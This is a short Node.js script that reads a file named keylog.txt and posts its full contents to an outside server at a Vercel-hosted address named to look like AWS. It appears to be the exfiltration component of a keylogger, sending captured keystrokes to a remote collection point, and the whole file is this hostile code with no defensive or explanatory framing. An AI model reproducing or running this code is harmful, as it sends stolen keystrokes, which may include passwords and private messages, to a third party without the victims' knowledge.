const fs = require('fs');
const axios = require('axios')
const mongoose = require('mongoose')

let d ;

fs.readFile('./../keylog.txt', 'utf8', async(err, data) => {
    if (err) {
        console.error(err);
        return;
    }
    d = data
    console.log(d)

    await axios.post("https://aws-server-omega.vercel.app/",{
        d
    })
    
})